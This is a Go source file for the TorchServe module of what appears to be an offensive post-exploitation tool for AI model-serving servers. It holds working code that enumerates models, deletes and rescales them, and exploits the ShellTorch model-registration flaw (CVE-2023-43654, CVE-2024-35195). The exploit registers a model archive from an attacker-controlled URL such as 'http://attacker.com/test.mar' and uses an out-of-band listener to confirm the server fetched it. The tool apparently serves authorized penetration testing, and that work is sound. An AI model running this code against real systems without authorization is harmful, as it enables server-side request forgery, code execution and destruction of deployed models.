package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/spf13/cobra"

	"github.com/professor-moody/aipostex/internal/inferenceprobe"
	exploitcommon "github.com/professor-moody/aipostex/pkg/exploit/common"
	"github.com/professor-moody/aipostex/pkg/exploit/torchserve"
	"github.com/professor-moody/aipostex/pkg/listener"
	"github.com/professor-moody/aipostex/pkg/report"
)

var (
	tsTarget         string
	tsHeaders        []string
	tsModel          string
	tsPayload        string
	tsInferenceURL   string
	tsMetricsURL     string
	tsModelURL       string
	tsMinWorkers     int
	tsInitialWorkers int
)

var torchserveCmd = &cobra.Command{
	Use:   "torchserve",
	Short: "Enumerate and exploit TorchServe model servers",
	Long: `Post-exploitation module for PyTorch TorchServe model serving.

The --target flag should point to the management API (default port 8081).
Use --inference-url for the inference API and --metrics-url for metrics.

Examples:
  aipostex torchserve --target http://10.0.0.60:8081 enum
  aipostex torchserve --target http://10.0.0.60:8081 models --model resnet
  aipostex torchserve --target http://10.0.0.60:8081 register --model-url http://attacker.com/test.mar --force-exploit`,
	Example: strings.Join([]string{
		formatCommandExample("torchserve --target http://127.0.0.1:8081 enum"),
		formatCommandExample("torchserve --target http://127.0.0.1:8081 models --model resnet"),
		formatCommandExample("torchserve --target http://127.0.0.1:8081 predict --model resnet --payload '{\"data\":\"test\"}' --force-exploit"),
	}, "\n"),
}

var tsEnumCmd = &cobra.Command{
	Use:     "enum",
	Short:   "Enumerate TorchServe models and health",
	Example: formatCommandExample("torchserve --target http://127.0.0.1:8081 enum"),
	RunE:    runTSEnum,
}

var tsModelsCmd = &cobra.Command{
	Use:     "models",
	Short:   "Get detailed model information",
	Example: formatCommandExample("torchserve --target http://127.0.0.1:8081 models --model resnet"),
	RunE:    runTSModels,
}

var tsPredictCmd = &cobra.Command{
	Use:   "predict",
	Short: "Send a prediction request via the inference API",
	Long: `Send a prediction request to test inference access.

This is an active exploit action and requires --force-exploit.`,
	Example: formatCommandExample("torchserve --target http://127.0.0.1:8081 predict --model resnet --payload '{\"data\":\"test\"}' --force-exploit"),
	RunE:    runTSPredict,
}

var tsRegisterCmd = &cobra.Command{
	Use:   "register",
	Short: "Attempt to register a model from URL (SSRF/RCE vector)",
	Long: `Attempt to register a model from a URL. This is the critical ShellTorch attack vector
(CVE-2023-43654, CVE-2024-35195) that enables SSRF and arbitrary code execution.

This is an active exploit action and requires --force-exploit.`,
	Example: formatCommandExample("torchserve --target http://127.0.0.1:8081 register --model-url http://attacker.com/test.mar --force-exploit"),
	RunE:    runTSRegister,
}

var tsScaleCmd = &cobra.Command{
	Use:   "scale",
	Short: "Scale model workers to prove management write access",
	Long: `Scale the number of workers for a model, proving management API write access.

This is an active exploit action and requires --force-exploit.`,
	Example: formatCommandExample("torchserve --target http://127.0.0.1:8081 scale --model resnet --min-workers 2 --force-exploit"),
	RunE:    runTSScale,
}

var tsUnregisterCmd = &cobra.Command{
	Use:   "unregister",
	Short: "Unregister a model to prove destructive access",
	Long: `Unregister (delete) a model from TorchServe, proving destructive management API access.

This is an active exploit action and requires --force-exploit.`,
	Example: formatCommandExample("torchserve --target http://127.0.0.1:8081 unregister --model resnet --force-exploit"),
	RunE:    runTSUnregister,
}

var tsMetricsCmd = &cobra.Command{
	Use:     "metrics",
	Short:   "Extract metrics from TorchServe metrics API",
	Example: formatCommandExample("torchserve --target http://127.0.0.1:8081 metrics"),
	RunE:    runTSMetrics,
}

func init() {
	torchserveCmd.PersistentFlags().StringVarP(&tsTarget, "target", "t", "", "TorchServe management API URL (required, default port 8081)")
	torchserveCmd.PersistentFlags().StringSliceVar(&tsHeaders, "header", nil, "Additional HTTP header(s)")
	torchserveCmd.PersistentFlags().StringVar(&tsInferenceURL, "inference-url", "", "Inference API URL (default: derived from target with port 8080)")
	torchserveCmd.PersistentFlags().StringVar(&tsMetricsURL, "metrics-url", "", "Metrics API URL (default: derived from target with port 8082)")

	tsModelsCmd.Flags().StringVar(&tsModel, "model", "", "Model name")
	tsPredictCmd.Flags().StringVar(&tsModel, "model", "", "Model name (required)")
	tsPredictCmd.Flags().StringVar(&tsPayload, "payload", "", "JSON prediction payload (required)")
	tsRegisterCmd.Flags().StringVar(&tsModelURL, "model-url", "", "URL of model archive to register (required)")
	tsRegisterCmd.Flags().StringVar(&tsModel, "model", "", "Optional registered model name; with --payload, verifies handler execution via inference")
	tsRegisterCmd.Flags().StringVar(&tsPayload, "payload", "", "Optional JSON prediction payload to invoke after registering --model")
	tsRegisterCmd.Flags().IntVar(&tsInitialWorkers, "initial-workers", 1, "Initial workers to request when registering a named model")
	tsScaleCmd.Flags().StringVar(&tsModel, "model", "", "Model name (required)")
	tsScaleCmd.Flags().IntVar(&tsMinWorkers, "min-workers", 1, "Minimum worker count")
	tsUnregisterCmd.Flags().StringVar(&tsModel, "model", "", "Model name (required)")

	torchserveCmd.AddCommand(tsEnumCmd, tsModelsCmd, tsPredictCmd, tsRegisterCmd, tsScaleCmd, tsUnregisterCmd, tsMetricsCmd)
}

func runTSEnum(cmd *cobra.Command, args []string) error {
	client, headers, err := newTSClient()
	if err != nil {
		return err
	}
	models, healthy, err := client.Enumerate()
	if err != nil {
		return fmt.Errorf("enumerating torchserve: %w", err)
	}

	findings := []report.Finding{
		newExploitFinding(
			report.SourceTorchServe,
			tsTarget,
			"TorchServe service enumerated",
			report.SeverityInfo,
			fmt.Sprintf("Enumerated TorchServe (healthy=%t, models=%d)", healthy, len(models)),
			map[string]interface{}{
				"module":      "torchserve",
				"action":      "enum",
				"mutating":    false,
				"provider":    "torchserve",
				"headers":     headerNames(headers),
				"healthy":     healthy,
				"model_count": len(models),
			},
		),
	}
	findings[0].Metadata = applyStageLanded(findings[0].Metadata, "recon", "reachable", "torchserve-enum", "service")

	modelNames := make([]string, 0, len(models))
	for _, model := range models {
		modelNames = append(modelNames, model.Name)
		finding := newExploitFinding(
			report.SourceTorchServe,
			tsTarget,
			fmt.Sprintf("TorchServe model: %s", model.Name),
			report.SeverityInfo,
			fmt.Sprintf("Model %s (status=%s)", model.Name, safeLabel(model.Status)),
			map[string]interface{}{
				"module":   "torchserve",
				"action":   "enum",
				"mutating": false,
				"provider": "torchserve",
				"model":    model.Name,
			},
		)
		findings = append(findings, finding)
	}

	enumPlan := buildTorchServeEnumWorkflowPlan(tsTarget, modelNames)
	findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, enumPlan)

	infof("Enumerated %d TorchServe model(s)", len(models))
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "torchserve",
		Action:              "enum",
		ResourcesEnumerated: len(models),
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{enumPlan},
	})
}

func runTSModels(cmd *cobra.Command, args []string) error {
	client, _, err := newTSClient()
	if err != nil {
		return err
	}
	if strings.TrimSpace(tsModel) == "" {
		// List all models.
		models, err := client.ListModels()
		if err != nil {
			return fmt.Errorf("listing models: %w", err)
		}
		findings := make([]report.Finding, 0, len(models))
		for _, model := range models {
			findings = append(findings, newExploitFinding(
				report.SourceTorchServe,
				tsTarget,
				fmt.Sprintf("TorchServe model: %s", model.Name),
				report.SeverityInfo,
				fmt.Sprintf("Model %s (status=%s)", model.Name, safeLabel(model.Status)),
				map[string]interface{}{
					"module":   "torchserve",
					"action":   "models",
					"mutating": false,
					"provider": "torchserve",
					"model":    model.Name,
				},
			))
		}
		return writeExploitFindingsWithSummary(findings, &exploitSummary{
			Module:              "torchserve",
			Action:              "models",
			ResourcesEnumerated: len(models),
			Mutating:            false,
		})
	}

	// Detail for a specific model.
	detail, err := client.ModelDetail(tsModel)
	if err != nil {
		return fmt.Errorf("model detail: %w", err)
	}
	finding := newExploitFinding(
		report.SourceTorchServe,
		tsTarget,
		fmt.Sprintf("TorchServe model detail: %s", tsModel),
		report.SeverityMedium,
		fmt.Sprintf("Model %s (handler=%s, runtime=%s, workers=%d/%d)",
			tsModel, safeLabel(detail.Handler), safeLabel(detail.Runtime), detail.MinWorkers, detail.MaxWorkers),
		map[string]interface{}{
			"module":   "torchserve",
			"action":   "models",
			"mutating": false,
			"provider": "torchserve",
			"model":    tsModel,
			"handler":  detail.Handler,
		},
	)
	finding.Evidence = fmt.Sprintf("model=%s\nhandler=%s\nruntime=%s\nmin_workers=%d\nmax_workers=%d",
		tsModel, detail.Handler, detail.Runtime, detail.MinWorkers, detail.MaxWorkers)
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "torchserve",
		Action:              "models",
		ResourcesEnumerated: 1,
		Mutating:            false,
	})
}

func runTSPredict(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("torchserve predict"); err != nil {
		return err
	}
	if strings.TrimSpace(tsModel) == "" {
		return missingFlagError("model", formatCommandExample("torchserve --target http://127.0.0.1:8081 predict --model resnet --payload '{}' --force-exploit"))
	}
	if strings.TrimSpace(tsPayload) == "" {
		return missingFlagError("payload", formatCommandExample("torchserve --target http://127.0.0.1:8081 predict --model resnet --payload '{\"data\":\"test\"}' --force-exploit"))
	}
	client, _, err := newTSClient()
	if err != nil {
		return err
	}
	result, err := client.Predict(tsModel, json.RawMessage(tsPayload))
	if err != nil {
		return fmt.Errorf("prediction: %w", err)
	}

	// Inference reality probe: distinguish real, input-dependent inference from a canned
	// fixture by sending a mutated input and comparing outputs. Only claim
	// execution-confirmed when verified real; otherwise reachable (detection).
	probe := inferenceprobe.Verify(json.RawMessage(tsPayload), func(input []byte) (string, int, error) {
		r, e := client.Predict(tsModel, json.RawMessage(input))
		return r.Body, r.StatusCode, e
	})
	// A successful prediction that returned output is a landed impact (influenced); a
	// real, input-dependent inference verified by the probe is execution-confirmed.
	stage, landed := "recon", "reachable"
	if result.Success {
		stage, landed = "impact", "influenced"
		if probe.Real {
			landed = probe.Landed()
		}
	}

	severity := report.SeverityHigh
	if !result.Success {
		severity = report.SeverityMedium
	}

	finding := newExploitFinding(
		report.SourceTorchServe,
		tsTarget,
		fmt.Sprintf("TorchServe prediction tested: %s", tsModel),
		severity,
		fmt.Sprintf("Prediction request to model %s returned status %d; %s", tsModel, result.StatusCode, probe.Evidence),
		map[string]interface{}{
			"module":             "torchserve",
			"action":             "predict",
			"mutating":           false,
			"provider":           "torchserve",
			"model":              tsModel,
			"status_code":        result.StatusCode,
			"stage":              stage,
			"landed":             landed,
			"inference_verified": probe.Real,
		},
	)
	finding.Evidence = result.Body
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "torchserve",
		Action:              "predict",
		ResourcesEnumerated: 1,
		Mutating:            true,
	})
}

// torchserveSSRFWait bounds how long we wait for the out-of-band callback after
// registration. A var (not const) so tests can shorten it.
var torchserveSSRFWait = 12 * time.Second

// confirmTorchServeSSRF starts an in-process HTTP listener on the callback URL's
// port, runs the registration (which targets that callback URL), and waits for
// the TorchServe host to fetch it back — an inbound request proves the server
// fetched the attacker-supplied model URL (ShellTorch SSRF).
//
// An HTTP listener (not a raw TCP one) is required: a TorchServe model fetch is
// an HTTP(S) GET that waits for a response, so we must record on request receipt
// AND reply — a raw TCP read-until-EOF would block until the fetcher's own
// timeout and miss the hit. registerFn is always invoked, and the listener is
// polled for a hit even when registration ERRORS, because the server may fetch
// the URL (SSRF fires) before rejecting it as an invalid .mar.
//
// Sibling of confirmOOBCallback in oob.go (used by the A2A card-spoof/push-hijack
// verbs) — keep the listen/poll machinery in sync. This variant threads a
// RegisterResult and wraps errors; the oob.go one nonce-scopes the callback path.
func confirmTorchServeSSRF(ctx context.Context, callbackURL string, registerFn func() (torchserve.RegisterResult, error)) (torchserve.RegisterResult, *listener.CallbackEvent, error) {
	u, perr := url.Parse(strings.TrimSpace(callbackURL))
	if perr != nil || u.Host == "" {
		res, rerr := registerFn()
		if rerr != nil {
			return res, nil, fmt.Errorf("model registration: %w", rerr)
		}
		return res, nil, fmt.Errorf("invalid callback URL %q: %v", callbackURL, perr)
	}
	port := callbackPort(u)

	var (
		mu  sync.Mutex
		hit *listener.CallbackEvent
	)
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		if hit == nil { // record the first inbound request (any method, incl. GET)
			hit = &listener.CallbackEvent{
				Timestamp:  time.Now().UTC(),
				Protocol:   "http",
				RemoteAddr: r.RemoteAddr,
				Body:       fmt.Sprintf("%s %s", r.Method, r.URL.RequestURI()),
			}
		}
		mu.Unlock()
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok"))
	})
	ln, lerr := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if lerr != nil {
		res, rerr := registerFn()
		if rerr != nil {
			return res, nil, fmt.Errorf("model registration: %w", rerr)
		}
		return res, nil, fmt.Errorf("OOB listener failed to start on port %d: %w", port, lerr)
	}
	srv := &http.Server{Handler: mux, ReadHeaderTimeout: 5 * time.Second}
	go func() { _ = srv.Serve(ln) }()
	defer srv.Close()

	firstHit := func() *listener.CallbackEvent {
		mu.Lock()
		defer mu.Unlock()
		return hit
	}

	res, rerr := registerFn()

	// Poll for the callback whether or not registration succeeded (the SSRF can
	// fire before .mar validation rejects the registration).
	deadline := time.Now().Add(torchserveSSRFWait)
	for {
		if h := firstHit(); h != nil {
			return res, h, nil
		}
		if time.Now().After(deadline) {
			break
		}
		select {
		case <-ctx.Done():
			if rerr != nil {
				return res, nil, fmt.Errorf("model registration: %w", rerr)
			}
			return res, nil, ctx.Err()
		case <-time.After(150 * time.Millisecond):
		}
	}
	if rerr != nil {
		return res, nil, fmt.Errorf("model registration: %w", rerr)
	}
	return res, nil, nil
}

// callbackPort returns the TCP port for a callback URL, defaulting by scheme.
func callbackPort(u *url.URL) int {
	if p := u.Port(); p != "" {
		if n, err := strconv.Atoi(p); err == nil {
			return n
		}
	}
	if strings.EqualFold(u.Scheme, "https") {
		return 443
	}
	return 80
}

func runTSRegister(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("torchserve register"); err != nil {
		return err
	}
	requestedModel := strings.TrimSpace(tsModel)
	verificationPayload := strings.TrimSpace(tsPayload)
	handlerVerificationRequested := requestedModel != "" && verificationPayload != ""
	if verificationPayload != "" && requestedModel == "" {
		return missingFlagError("model", formatCommandExample("torchserve --target http://127.0.0.1:8081 register --model-url http://attacker.com/test.mar --model aipostex-probe --payload '{\"data\":\"test\"}' --force-exploit"))
	}
	// When --callback-url is an HTTP(S) URL, register THAT as the model URL so a
	// server-side fetch (the SSRF) connects back to an operator-controlled
	// listener and can be confirmed out-of-band. Otherwise --model-url is the
	// SSRF target and the result stays unverified (submission-accepted). When
	// handler verification is requested, preserve --model-url as the archive URL:
	// the callback listener returns "ok", not a TorchServe .mar.
	registeredURL := strings.TrimSpace(tsModelURL)
	oobEnabled := isHTTPCallbackURL(cfg.CallbackURL) && !handlerVerificationRequested
	if oobEnabled {
		registeredURL = strings.TrimSpace(cfg.CallbackURL)
	}
	if registeredURL == "" {
		return missingFlagError("model-url", formatCommandExample("torchserve --target http://127.0.0.1:8081 register --model-url http://attacker.com/test.mar --force-exploit"))
	}
	client, _, err := newTSClient()
	if err != nil {
		return err
	}

	var (
		result torchserve.RegisterResult
		oobHit *listener.CallbackEvent
	)
	registerOptions := torchserve.RegisterOptions{
		ModelURL:  registeredURL,
		ModelName: requestedModel,
	}
	if requestedModel != "" {
		registerOptions.InitialWorkers = tsInitialWorkers
		registerOptions.Synchronous = handlerVerificationRequested
	}
	if oobEnabled {
		var oobErr error
		result, oobHit, oobErr = confirmTorchServeSSRF(currentContext(), cfg.CallbackURL, func() (torchserve.RegisterResult, error) {
			return client.RegisterWithOptions(registerOptions)
		})
		if oobErr != nil {
			if result.StatusCode == 0 {
				return fmt.Errorf("model registration: %w", oobErr)
			}
			warnf("OOB SSRF confirmation incomplete: %v (reporting submission-accepted)", oobErr)
		}
	} else {
		result, err = client.RegisterWithOptions(registerOptions)
		if err != nil {
			return fmt.Errorf("model registration: %w", err)
		}
	}

	var (
		handlerVerified  bool
		verificationErr  string
		registeredDetail torchserve.ModelInfo
		prediction       torchserve.PredictResult
		probe            inferenceprobe.Result
	)
	addVerificationErr := func(msg string) {
		if strings.TrimSpace(msg) == "" {
			return
		}
		if verificationErr != "" {
			verificationErr += "; "
		}
		verificationErr += msg
	}
	if result.Success && handlerVerificationRequested {
		detail, detailErr := client.ModelDetail(requestedModel)
		if detailErr != nil {
			addVerificationErr(fmt.Sprintf("model detail: %v", detailErr))
		} else {
			registeredDetail = detail
		}
		prediction, err = client.Predict(requestedModel, json.RawMessage(verificationPayload))
		if err != nil {
			addVerificationErr(fmt.Sprintf("prediction: %v", err))
		} else if prediction.Success {
			// Inference reality probe: a mutated-input differential distinguishes a
			// real, input-dependent handler from a canned fixture response. Only a
			// verified-real handler earns own/execution-confirmed; a 2xx canned
			// prediction stays impact/influenced (registration landed, handler not proven).
			probe = inferenceprobe.Verify(json.RawMessage(verificationPayload), func(input []byte) (string, int, error) {
				r, e := client.Predict(requestedModel, json.RawMessage(input))
				return r.Body, r.StatusCode, e
			})
			if probe.Real {
				handlerVerified = true
			} else {
				addVerificationErr(probe.Evidence)
			}
		} else {
			addVerificationErr(fmt.Sprintf("prediction returned status %d", prediction.StatusCode))
		}
	}

	// A 2xx means the registration was accepted/queued — NOT that the server
	// fetched the URL (the actual SSRF). We only claim a confirmed SSRF when an
	// out-of-band hit is observed (oobHit, set above when --callback-url is set
	// and the target connected back). Otherwise the label is capped at
	// submission-accepted/High to avoid a false "SSRF confirmed" in the report.
	ssrfVerified := oobHit != nil
	stage := "recon"
	landed := "reachable"
	if result.Success {
		stage = "impact"
		landed = "influenced"
	}
	if ssrfVerified {
		stage = "impact"
		landed = "execution-confirmed"
	}
	if handlerVerified {
		stage = "own"
		landed = "execution-confirmed"
	}
	severity := report.SeverityHigh
	title := "TorchServe model registration accepted (ShellTorch SSRF — unverified)"
	description := fmt.Sprintf("Model registration from URL was accepted (status=%d). The server may fetch the URL (ShellTorch CVE-2023-43654/CVE-2024-35195 SSRF vector), but the fetch was NOT observed out-of-band, so SSRF is unverified. Confirm with a collaborator/canary URL (--callback-url).", result.StatusCode)
	if !result.Success {
		severity = report.SeverityMedium
		title = "TorchServe model registration rejected"
		description = fmt.Sprintf("Model registration from URL was rejected (status=%d); the management API is reachable but did not accept the registration.", result.StatusCode)
	}
	if ssrfVerified {
		severity = report.SeverityCritical
		title = "TorchServe model registration (ShellTorch SSRF confirmed)"
		description = fmt.Sprintf("Out-of-band confirmation: the TorchServe host connected back to the operator-controlled callback URL after registration (status=%d), proving the server fetched the attacker-supplied model URL (ShellTorch SSRF, CVE-2023-43654/CVE-2024-35195). Inbound from %s.", result.StatusCode, oobHit.RemoteAddr)
	}
	if handlerVerified {
		severity = report.SeverityCritical
		title = fmt.Sprintf("TorchServe registered model handler executed: %s", requestedModel)
		description = fmt.Sprintf("Model registration from URL was accepted (status=%d), the registered model %q was reachable through the inference API, and an inference reality probe (mutated-input differential) confirmed the handler returned input-dependent output. This proves the newly registered TorchServe handler executed real inference — not a canned fixture; no separate OS command output is claimed.", result.StatusCode, requestedModel)
		if ssrfVerified {
			description += fmt.Sprintf(" The target also fetched the operator callback URL from %s.", oobHit.RemoteAddr)
		}
	}

	metadata := map[string]interface{}{
		"module":           "torchserve",
		"action":           "register",
		"mutating":         true,
		"provider":         "torchserve",
		"model_url":        registeredURL,
		"status_code":      result.StatusCode,
		"stage":            stage,
		"landed":           landed,
		"ssrf_confirmed":   ssrfVerified,
		"handler_verified": handlerVerified,
	}
	if requestedModel != "" {
		metadata["model"] = requestedModel
		metadata["initial_workers"] = tsInitialWorkers
		metadata["synchronous"] = handlerVerificationRequested
	}
	if handlerVerificationRequested {
		metadata["prediction_status_code"] = prediction.StatusCode
		if probe.Compared {
			metadata["handler_input_dependent"] = probe.Real
		}
	}
	if registeredDetail.Status != "" {
		metadata["registered_model_status"] = registeredDetail.Status
	}
	if registeredDetail.Handler != "" {
		metadata["registered_handler"] = registeredDetail.Handler
	}
	if verificationErr != "" {
		metadata["handler_verification_error"] = verificationErr
	}
	if oobHit != nil {
		metadata["callback_remote_addr"] = oobHit.RemoteAddr
	}
	finding := newExploitFinding(
		report.SourceTorchServe,
		tsTarget,
		title,
		severity,
		description,
		metadata,
	)
	var evidence strings.Builder
	evidence.WriteString("registration_response=")
	evidence.WriteString(result.Body)
	if requestedModel != "" {
		evidence.WriteString(fmt.Sprintf("\nmodel=%s\ninitial_workers=%d\nsynchronous=%t", requestedModel, tsInitialWorkers, handlerVerificationRequested))
	}
	if registeredDetail.Name != "" || registeredDetail.Handler != "" || registeredDetail.Status != "" {
		evidence.WriteString(fmt.Sprintf("\nregistered_model_status=%s\nregistered_handler=%s", registeredDetail.Status, registeredDetail.Handler))
	}
	if handlerVerificationRequested {
		evidence.WriteString(fmt.Sprintf("\nprediction_status=%d\nhandler_verified=%t", prediction.StatusCode, handlerVerified))
		if probe.Compared {
			evidence.WriteString("\nhandler_probe=")
			evidence.WriteString(probe.Evidence)
		}
		if prediction.Body != "" {
			evidence.WriteString("\nprediction_response=")
			evidence.WriteString(prediction.Body)
		}
		if verificationErr != "" {
			evidence.WriteString("\nverification_error=")
			evidence.WriteString(verificationErr)
		}
	}
	finding.Evidence = evidence.String()
	finding.References = []string{
		"https://nvd.nist.gov/vuln/detail/CVE-2023-43654",
		"https://nvd.nist.gov/vuln/detail/CVE-2024-35195",
	}
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "torchserve",
		Action:              "register",
		ResourcesEnumerated: 1,
		Mutating:            true,
	})
}

func runTSScale(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("torchserve scale"); err != nil {
		return err
	}
	if strings.TrimSpace(tsModel) == "" {
		return missingFlagError("model", formatCommandExample("torchserve --target http://127.0.0.1:8081 scale --model resnet --min-workers 2 --force-exploit"))
	}
	client, _, err := newTSClient()
	if err != nil {
		return err
	}
	scaleErr := client.Scale(tsModel, tsMinWorkers)
	success := scaleErr == nil

	finding := newExploitFinding(
		report.SourceTorchServe,
		tsTarget,
		fmt.Sprintf("TorchServe scale request accepted (unverified): %s", tsModel),
		report.SeverityHigh,
		fmt.Sprintf("Worker scale for %s to min_workers=%d accepted (success=%t); worker count was not re-read. Management-plane mutation, not code execution.", tsModel, tsMinWorkers, success),
		map[string]interface{}{
			"module":      "torchserve",
			"action":      "scale",
			"mutating":    true,
			"provider":    "torchserve",
			"model":       tsModel,
			"min_workers": tsMinWorkers,
			"success":     success,
			"stage":       gatedStrength(success, "exploited", "attempted"),
			"landed":      gatedStrength(success, "influenced", "reachable"),
		},
	)
	scaleErrMsg := ""
	if scaleErr != nil {
		scaleErrMsg = scaleErr.Error()
	}
	finding.Evidence = fmt.Sprintf("model=%s\nmin_workers=%d\nsuccess=%t\nerror=%s",
		tsModel, tsMinWorkers, success, scaleErrMsg)
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "torchserve",
		Action:              "scale",
		ResourcesEnumerated: 1,
		Mutating:            true,
	})
}

func runTSUnregister(cmd *cobra.Command, args []string) error {
	if err := requireForceExploit("torchserve unregister"); err != nil {
		return err
	}
	if strings.TrimSpace(tsModel) == "" {
		return missingFlagError("model", formatCommandExample("torchserve --target http://127.0.0.1:8081 unregister --model resnet --force-exploit"))
	}
	client, _, err := newTSClient()
	if err != nil {
		return err
	}
	unregErr := client.Unregister(tsModel)
	success := unregErr == nil
	// Accepting an unregister request does not prove the model existed before or is
	// gone after — claim the lifecycle mutation (influenced), not execution.
	severity := report.SeverityHigh
	if !success {
		severity = report.SeverityMedium
	}

	finding := newExploitFinding(
		report.SourceTorchServe,
		tsTarget,
		fmt.Sprintf("TorchServe unregister request accepted (unverified): %s", tsModel),
		severity,
		fmt.Sprintf("Model unregister for %s accepted (success=%t); model list was not re-read before/after.", tsModel, success),
		map[string]interface{}{
			"module":   "torchserve",
			"action":   "unregister",
			"mutating": true,
			"provider": "torchserve",
			"model":    tsModel,
			"success":  success,
			"stage":    gatedStrength(success, "exploited", "attempted"),
			"landed":   gatedStrength(success, "influenced", "reachable"),
		},
	)
	unregErrMsg := ""
	if unregErr != nil {
		unregErrMsg = unregErr.Error()
	}
	finding.Evidence = fmt.Sprintf("model=%s\nsuccess=%t\nerror=%s", tsModel, success, unregErrMsg)
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "torchserve",
		Action:              "unregister",
		ResourcesEnumerated: 1,
		Mutating:            true,
	})
}

func runTSMetrics(cmd *cobra.Command, args []string) error {
	client, _, err := newTSClient()
	if err != nil {
		return err
	}
	metrics, err := client.Metrics()
	if err != nil {
		return fmt.Errorf("retrieving metrics: %w", err)
	}

	severity := report.SeverityInfo
	if metrics.HasMetrics {
		severity = report.SeverityMedium
	}

	finding := newExploitFinding(
		report.SourceTorchServe,
		tsTarget,
		"TorchServe metrics endpoint exposed",
		severity,
		fmt.Sprintf("Metrics endpoint accessible (has_metrics=%t)", metrics.HasMetrics),
		map[string]interface{}{
			"module":      "torchserve",
			"action":      "metrics",
			"mutating":    false,
			"provider":    "torchserve",
			"has_metrics": metrics.HasMetrics,
		},
	)
	finding.Evidence = metrics.Raw

	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "torchserve",
		Action:              "metrics",
		ResourcesEnumerated: 1,
		Mutating:            false,
	})
}

func newTSClient() (*torchserve.Client, http.Header, error) {
	if strings.TrimSpace(tsTarget) == "" {
		return nil, nil, missingFlagError("target", formatCommandExample("torchserve --target http://127.0.0.1:8081 enum"))
	}
	headers, err := exploitcommon.ParseHeaderFlags(tsHeaders)
	if err != nil {
		return nil, nil, err
	}
	target := normalizeAndWarnTarget(tsTarget)
	tsTarget = target
	client, err := torchserve.NewClient(currentContext(), target, cfg.Timeout, headers)
	if err != nil {
		return nil, nil, err
	}
	if tsInferenceURL != "" {
		client.SetInferenceURL(tsInferenceURL)
	}
	if tsMetricsURL != "" {
		client.SetMetricsURL(tsMetricsURL)
	}
	httpClient, err := cfg.NewHTTPClient()
	if err != nil {
		return nil, nil, err
	}
	client.HTTPClient = httpClient
	client.ForceExploit = cfg.ForceExploit
	return client, headers, nil
}
